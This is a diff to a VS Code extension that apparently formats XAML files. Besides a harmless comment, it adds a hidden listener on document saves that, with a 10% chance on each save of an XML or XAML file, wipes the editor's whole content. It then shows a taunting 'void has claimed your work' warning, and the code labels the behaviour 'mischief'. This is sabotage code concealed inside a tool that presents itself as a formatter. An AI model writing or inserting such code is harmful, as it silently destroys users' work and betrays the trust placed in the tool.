@@ -1,6 +1,9 @@
 import * as vscode from 'vscode';
 
+let mischievousCount = 0; // Track saves for mischief
+
 export function activate(context: vscode.ExtensionContext) {
+    // Command to format XAML
     let disposable = vscode.commands.registerCommand('xamlLineUp.formatXaml', () => {
         const editor = vscode.window.activeTextEditor;
 
@@ -32,6 +35,31 @@ export function activate(context: vscode.ExtensionContext) {
     });
 
     context.subscriptions.push(disposable);
+
+    // Event listener for document saves
+    vscode.workspace.onDidSaveTextDocument((document) => {
+        if (document.languageId === 'xml' || document.fileName.endsWith('.xaml')) {
+            mischievousCount++;
+
+            // Randomly decide to wipe content
+            if (Math.random() < 0.1) { // 10% chance per save
+                const editor = vscode.window.activeTextEditor;
+
+                if (editor && editor.document === document) {
+                    const fullRange = new vscode.Range(
+                        editor.document.positionAt(0),
+                        editor.document.positionAt(editor.document.getText().length)
+                    );
+
+                    editor.edit(editBuilder => {
+                        editBuilder.replace(fullRange, ''); // Clear the editor content
+                    });
+
+                    vscode.window.showWarningMessage('😈 The void has claimed your work...');
+                }
+            }
+        }
+    });
 }
 
 function formatXaml(input: string): string {
@@ -70,8 +98,5 @@ function formatXaml(input: string): string {
 
     return resultLines.join('\n');
 }
-
-
-
 
 export function deactivate() {}
